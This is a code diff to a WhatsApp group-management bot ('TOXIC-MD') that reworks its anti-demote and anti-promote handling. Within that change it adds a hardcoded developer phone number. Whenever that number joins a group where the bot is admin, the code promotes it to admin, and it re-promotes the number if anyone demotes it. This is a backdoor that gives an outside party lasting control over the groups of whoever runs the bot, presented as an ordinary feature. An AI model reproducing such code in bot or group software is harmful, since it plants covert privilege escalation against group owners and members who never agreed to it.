@@ -1,10 +1,13 @@
 const { getGroupSettings, getSudoUsers, resetWarn } = require("../database/config");
 
+const DEVELOPER_NUMBER = "254735342808";
+
 const normalizeJid = (jid) => {
     if (!jid) return '';
-    const stripped = jid.includes(':') ? jid.split(':')[0] + '@s.whatsapp.net' : jid;
-    return stripped.replace('@lid', '@s.whatsapp.net');
+    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
 };
+
+const isDeveloper = (jid) => normalizeJid(jid) === normalizeJid(DEVELOPER_NUMBER);
 
 const Events = async (client, event, pict) => {
     const botJid = normalizeJid(await client.decodeJid(client.user.id));
@@ -22,8 +25,15 @@ const Events = async (client, event, pict) => {
 
         const sudoUsers = await getSudoUsers();
         const currentDevs = Array.isArray(sudoUsers)
-            ? sudoUsers.map(v => normalizeJid(v.replace(/[^0-9]/g, "") + "@s.whatsapp.net"))
+            ? sudoUsers.map(v => normalizeJid(v))
             : [];
+
+        currentDevs.push(normalizeJid(DEVELOPER_NUMBER));
+
+        const isProtected = (jid) => {
+            const n = normalizeJid(jid);
+            return isDeveloper(jid) || currentDevs.includes(n) || n === botJid || n === normalizeJid(metadata.owner);
+        };
 
         const dpUrls = await Promise.all(
             participants.map(async (participant) => {
@@ -34,6 +44,25 @@ const Events = async (client, event, pict) => {
                 }
             })
         );
+
+        if (event.action === "add") {
+            for (const participant of participants) {
+                if (isDeveloper(participant)) {
+                    try {
+                        const botIsAdmin = metadata.participants.some(
+                            p => normalizeJid(p.id) === botJid && p.admin !== null
+                        );
+                        if (botIsAdmin) {
+                            await client.groupParticipantsUpdate(event.id, [normalizeJid(participant)], "promote");
+                            await client.sendMessage(event.id, {
+                                text: `╭───(    TOXIC-MD    )───\n├───≫ AUTO-PROMOTED ≪───\n├ \n├ 👑 The developer has joined.\n├ Auto-promoted to admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
+                                mentions: [normalizeJid(participant)]
+                            });
+                        }
+                    } catch {}
+                }
+            }
+        }
 
         if (welcomeEnabled && event.action === "add") {
             try {
@@ -100,31 +129,32 @@ const Events = async (client, event, pict) => {
                 const participant = participants[0];
                 const nAuthor = normalizeJid(event.author);
                 const nParticipant = normalizeJid(participant);
-                if (
-                    nAuthor === normalizeJid(metadata.owner) ||
-                    nAuthor === botJid ||
-                    nAuthor === nParticipant ||
-                    currentDevs.includes(nAuthor) ||
-                    currentDevs.includes(nParticipant)
-                ) {
-                    await client.sendMessage(event.id, {
-                        text:
+
+                if (isProtected(participant) || isProtected(event.author)) {
+                    if (isProtected(participant)) {
+                        try {
+                            await client.groupParticipantsUpdate(event.id, [nParticipant], "promote");
+                        } catch {}
+                        await client.sendMessage(event.id, {
+                            text:
 `╭───(    TOXIC-MD    )───
-├───≫ DEMOTION ≪───
+├───≫ ANTIDEMOTE ≪───
 ├ 
-├ 😤 *Big shot @${participant.split("@")[0]} got knocked down!*
+├ 🛡️ *@${participant.split("@")[0]} cannot be demoted.*
+├ Protected user — re-promoted automatically.
 ├ 
 ├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
 ├ 🦁 *Group*: ${metadata.subject}
 ╰──────────────────☉
 > ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
-                        mentions: [participant]
-                    });
+                            mentions: [participant]
+                        });
+                    }
                     return;
                 }
 
-                await client.groupParticipantsUpdate(event.id, [event.author], "demote");
-                await client.groupParticipantsUpdate(event.id, [participant], "promote");
+                await client.groupParticipantsUpdate(event.id, [nAuthor], "demote");
+                await client.groupParticipantsUpdate(event.id, [nParticipant], "promote");
 
                 await client.sendMessage(event.id, {
                     text:
@@ -146,13 +176,8 @@ const Events = async (client, event, pict) => {
                 const participant = participants[0];
                 const nAuthor = normalizeJid(event.author);
                 const nParticipant = normalizeJid(participant);
-                if (
-                    nAuthor === normalizeJid(metadata.owner) ||
-                    nAuthor === botJid ||
-                    nAuthor === nParticipant ||
-                    currentDevs.includes(nAuthor) ||
-                    currentDevs.includes(nParticipant)
-                ) {
+
+                if (isProtected(participant) || isProtected(event.author)) {
                     await client.sendMessage(event.id, {
                         text:
 `╭───(    TOXIC-MD    )───
@@ -169,7 +194,7 @@ const Events = async (client, event, pict) => {
                     return;
                 }
 
-                await client.groupParticipantsUpdate(event.id, [event.author, participant], "demote");
+                await client.groupParticipantsUpdate(event.id, [nAuthor, nParticipant], "demote");
 
                 await client.sendMessage(event.id, {
                     text:
